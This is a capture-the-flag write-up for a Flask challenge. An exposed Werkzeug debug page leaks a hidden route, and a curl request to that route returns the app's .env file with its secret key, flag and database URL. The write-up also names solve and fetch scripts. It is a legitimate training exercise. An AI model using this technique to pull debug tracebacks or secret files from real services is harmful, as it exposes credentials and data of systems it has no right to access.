# Writeup: Debug Disaster

## TL;DR

`/admin` triggers a Flask/Werkzeug debug page.
The traceback leaks the hidden route `/flg_bar`.
Requesting `/flg_bar` returns `.env`, which contains the flag directly.

## Recon

The main page is just:

```html
<h2>Welcome to Startup Portal</h2>
```

Requesting `/admin` returns a Werkzeug debugger page with the exception:

```text
Debug leak triggered: Dirbuster maybe in your future!
```

The traceback exposes part of `/app/app.py`, including the hidden route:

```python
@app.route("/flg_bar")
def env():
    return open(".env").read(), 200, {"Content-Type": "text/plain"}
```

## Exploit

After seeing `/flg_bar` in the traceback, request it directly:

```bash
curl http://23.179.17.92:5002/flg_bar
```

That returns:

```text
SECRET_KEY=supersecret
FLAG=CIT{H1dd3n_D1r5_3v3rywh3r3}
DATABASE_URL=sqlite:///prod.db
```

## Reproduction

There was no source archive attached to the challenge, so I fetched the live-exposed artifacts into `other/fetched/`:

- `home.html`
- `admin-debug.html`
- `.env`
- `debugger.js`
- `style.css`

I also reconstructed the minimal Flask app from the leaked traceback and observed behavior in `other/reconstructed/`.

Refresh the fetched artifacts:

```bash
./scripts/fetch-live-artifacts.sh
```

Run the reconstructed service locally:

```bash
./scripts/run-local.sh 5002
```

Solve either local or remote:

```bash
uv run ./scripts/solve.py http://127.0.0.1:5002
uv run ./scripts/solve.py http://23.179.17.92:5002
```

## Flag

`CIT{H1dd3n_D1r5_3v3rywh3r3}`
